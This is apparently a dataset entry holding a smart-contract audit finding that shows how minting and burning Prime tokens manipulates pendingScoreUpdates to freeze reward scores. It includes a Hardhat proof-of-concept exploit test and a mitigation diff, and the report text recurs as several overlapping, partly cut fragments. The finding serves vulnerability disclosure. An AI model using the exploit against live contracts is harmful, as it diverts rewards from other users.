        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

(Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance).

However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users.

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so.

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the 